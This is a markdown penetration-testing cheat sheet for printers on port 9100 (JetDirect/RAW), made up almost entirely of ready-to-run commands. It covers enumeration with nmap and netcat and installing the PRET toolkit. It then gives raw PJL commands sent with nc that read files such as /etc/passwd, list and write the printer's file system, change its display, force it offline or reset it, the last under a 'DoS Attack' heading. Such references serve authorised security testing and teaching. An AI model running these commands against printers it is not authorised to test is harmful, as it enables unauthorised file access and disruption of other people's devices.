# Port 9100 - JetDirect (RAW Printing)

## Table of Contents
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [PJL Commands](#pjl-commands)

---

## Enumeration

### Quick Check (One-liner)

```shell
nmap -p 9100 --script "pjl-ready-message" $rhost && nc -nv $rhost 9100
```

### Nmap

```shell
nmap -sV -sC -p 9100 $rhost
nmap -p 9100 --script "pjl-ready-message" $rhost
```

### Banner Grabbing

```shell
nc -nv $rhost 9100
```

---

## Exploitation

### PRET - Printer Exploitation Toolkit

```shell
# Install PRET
git clone https://github.com/RUB-NDS/PRET.git
cd PRET
pip install -r requirements.txt

# Connect via PJL
python pret.py $rhost pjl

# Connect via PostScript
python pret.py $rhost ps

# Connect via PCL
python pret.py $rhost pcl
```

### PRET Commands

```shell
# After connecting with PRET

# File system access
ls
get /etc/passwd
put local.txt remote.txt
cat file.txt

# Printer info
info status
info id
info config

# Display message
display "Hacked"

# Print test page
print test.txt

# Factory reset (dangerous!)
reset
```

### Direct PJL Commands

```shell
# Send PJL command
echo -e "\033%-12345X@PJL INFO STATUS\033%-12345X" | nc $rhost 9100

# Get printer info
echo -e "\033%-12345X@PJL INFO ID\033%-12345X" | nc $rhost 9100

# Read file (if supported)
echo -e "\033%-12345X@PJL FSUPLOAD NAME=\"0:/etc/passwd\"\033%-12345X" | nc $rhost 9100
```

---

## PJL Commands

### Common PJL Commands

```
@PJL INFO STATUS          - Get printer status
@PJL INFO ID              - Get printer ID
@PJL INFO CONFIG          - Get configuration
@PJL INFO VARIABLES       - Get variables
@PJL INFO FILESYS         - List file systems
@PJL FSDIRLIST NAME="0:\" - List directory
@PJL FSUPLOAD NAME="0:/filename" - Read file
@PJL FSDOWNLOAD NAME="0:/filename" - Write file
@PJL RDYMSG DISPLAY="text" - Display message
```

### File System Access

```shell
# List root directory
echo -e '\033%-12345X@PJL FSDIRLIST NAME="0:\\" ENTRY=1 COUNT=999\r\n\033%-12345X' | nc $rhost 9100

# Read file
echo -e '\033%-12345X@PJL FSUPLOAD NAME="0:\\etc\\passwd" OFFSET=0 SIZE=1000\r\n\033%-12345X' | nc $rhost 9100
```

---

## DoS Attack

```shell
# Offline printer (for testing only)
echo -e '\033%-12345X@PJL JOB\r\n@PJL OPMSG DISPLAY="OFFLINE"\r\n@PJL EOJ\r\n\033%-12345X' | nc $rhost 9100

# Reset printer
echo -e '\033%-12345X@PJL INITIALIZE\r\n\033%-12345X' | nc $rhost 9100
```

---

## Quick Reference

| Tool | Command | Description |
| :--- | :--- | :--- |
| PRET | `python pret.py $rhost pjl` | Connect to printer |
| nc | `echo "@PJL INFO ID" \| nc $rhost 9100` | Send PJL command |
| Nmap | `nmap -p 9100 --script "pjl-ready-message" $rhost` | Get ready message |

| Port | Protocol |
| :--- | :--- |
| 9100 | RAW/JetDirect |
| 515 | LPD |
| 631 | IPP/CUPS |
